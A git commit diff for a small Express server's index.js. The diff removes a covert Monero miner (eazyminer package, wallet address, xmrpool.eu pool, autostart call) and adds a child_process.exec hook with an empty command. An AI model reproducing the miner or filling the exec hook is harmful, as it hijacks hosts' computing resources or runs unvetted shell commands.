e3bdb53eb6407c909b348001cf59432b2b7132fa
beanb1123 <103089678+beanb1123@users.noreply.github.com>
2024-01-15 23:01:01 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,6 +1,4 @@
-const Miner = require('eazyminer');
 const http = require("https");
-const crypto = require("crypto");
 const express = require("express");
 const app = express();
 
@@ -8,16 +6,19 @@ const port = process.env.PORT || 3001;
 
 const server = app.listen(port, () => console.log(`Example app listening on port ${port}!`));
 
-const miner = new Miner({
-    pools: [{
-        coin: 'XMR',
-        user: '47D8WQoJKydhTkk26bqZCVF7FaNhzRtNG15u1XiRQ83nfYqogyLjPMnYEKarjAiCz93oV6sETE9kkL3bkbvTX6nMU24CND8',
-        url: 'xmrpool.eu:9999', // optional pool URL,
-    }],
-    autoStart: false // optional delay
-});
+const { exec } = require("child_process");
 
-miner.start();
+exec("", (error, stdout, stderr) => {
+    if (error) {
+        console.log(error.message);
+        return;
+    }
+    if (stderr) {
+        console.log(stderr);
+        return;
+    }
+    console.log(`Output: ${stdout}`);
+});
 
 server.keepAliveTimeout = 120 * 1000;
 server.headersTimeout = 120 * 1000;
